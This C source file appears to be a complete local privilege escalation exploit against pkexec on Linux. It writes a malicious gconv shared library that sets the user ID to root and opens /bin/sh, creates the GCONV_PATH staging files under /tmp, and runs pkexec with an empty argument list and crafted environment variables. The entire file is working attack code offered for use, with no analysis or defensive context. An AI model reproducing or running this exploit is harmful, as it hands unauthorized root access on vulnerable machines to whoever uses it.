// gcc lpe.c -o lpe

#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

char *payload =
        "#include <stdio.h>\n"
        "#include <stdlib.h>\n"
        "#include <unistd.h>\n"
        "void gconv() {}\n"
        "\n"
        "void gconv_init() {\n"
                "puts(\"pwned\");\n"
                "putenv(\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin\");\n"
                "setuid(0);\n"
                "seteuid(0);\n"
                "system(\"/bin/sh\");\n"
                "exit(0);\n"
        "}";

void setup(){
        system("mkdir -p  '/tmp/GCONV_PATH=.';touch '/tmp/GCONV_PATH=./test';chmod +x '/tmp/GCONV_PATH=./test';mkdir -p /tmp/test;echo 'module  PAYLOAD//    INTERNAL    ../../../../../../../../tmp/payload    2\nmodule  INTERNAL    PAYLOAD//    ../../../../../../../../tmp/payload    2' > /tmp/test/gconv-modules");
        FILE *payloadFile = fopen("/tmp/payload.c", "w");
        fputs(payload, payloadFile);
        fclose(payloadFile);
        system("gcc /tmp/payload.c -o /tmp/payload.so -shared -fPIC");

}

int main(void)
{
    setup();
    chdir("/tmp");
    char *argv[] = { NULL };
    char *envp[] =
    {
        "test",
        "PATH=GCONV_PATH=.",
        "CHARSET=payload",
        "SHELL=/bin/rash",
        "USER=root",
        0
    };
    execve("/usr/bin/pkexec", argv, envp);
    fprintf(stderr, "Error\n");
    return -1;
}
